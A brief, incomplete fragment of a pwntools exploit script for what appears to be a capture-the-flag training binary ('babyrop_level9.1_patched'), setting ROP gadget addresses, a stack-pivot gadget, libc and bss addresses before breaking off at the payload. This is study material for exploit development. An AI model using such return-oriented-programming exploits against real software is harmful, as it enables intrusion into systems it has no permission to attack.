...
binary = './babyrop_level9.1_patched'
elf = ELF(binary)
libc = ELF('./libc.so.6')
...
pop_rdi = 0x0000000000402283 # change 
pop_rsp_pop_r13_pop_rbp_ret = 0x000000000040227d # change
...
entry_addr = 0x004010f0


bss_addr1 = 0x415080 + 8 * 2 # change
payload = flat(	
